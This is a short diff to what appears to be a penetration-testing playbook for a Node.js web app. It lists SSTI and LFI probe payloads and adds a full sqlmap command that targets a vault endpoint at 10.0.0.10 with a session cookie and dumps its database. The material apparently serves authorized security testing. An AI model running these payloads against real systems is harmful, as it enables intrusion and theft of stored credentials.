@@ -26,3 +26,11 @@ Use curl for API, browser for web vulns. Document any confirmed findings with PO
 1. Learn it's Node.js → Try SSTI: {{7*7}}
 2. See /usr/app/ → Try LFI: ../../../../usr/app/package.json
 3. Find dependencies → Check for vulnerable versions
+
+
+sqlmap -u "http://10.0.0.10/vault/add" \
+  --data='{"vaulttitle":"*","vaultusername":"*","vaultpassword":"*"}' \
+  --headers="Content-Type: application/json" \
+  --cookie="connect.sid=s%3AdR3xsr6cihqDBYCreaF3wSfhTeWKqruZ.AWPS0%2B%2BPoZTxR788rPPZc2ucZ5400oYsPYME9JHFOEA" \
+  --batch --level=5 --risk=3 \
+  --dump --delay=1
